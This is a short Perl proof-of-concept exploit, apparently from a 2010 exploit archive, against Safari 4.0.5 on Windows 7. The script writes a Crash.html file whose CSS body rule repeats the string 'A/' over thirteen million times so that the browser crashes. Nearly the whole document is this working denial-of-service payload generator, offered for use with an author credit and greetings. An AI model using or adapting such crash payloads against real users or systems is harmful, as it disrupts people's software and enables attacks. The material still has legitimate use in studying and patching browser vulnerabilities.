#!/usr/bin/perl
# Safari 4.0.5 (531.22.7) Denial of Service
# Exploit Title: [Safari 4.0.5 (531.22.7) Denial of Service]
# Date: [2010-04-26]
# Author: [Xss mAn]
# Software Link: [http://www.apple.com/safari/download/]
# Version: [Safari 4.0.5 (531.22.7)]
# Tested on: [windows 7]
#Gr33t [2] : T-T34M
$headr1="<HTML>\n<style type=\"text\/css\"\>\n";
$headr2="\nbody {alink: "."A/" x 13333337 ."}\n";
$headr3="</style>\n</HTML>";
open(file ,'>>Crash.html');
print file $headr1.$headr2.$headr3;
close(file);
#perl 4 M3N ;)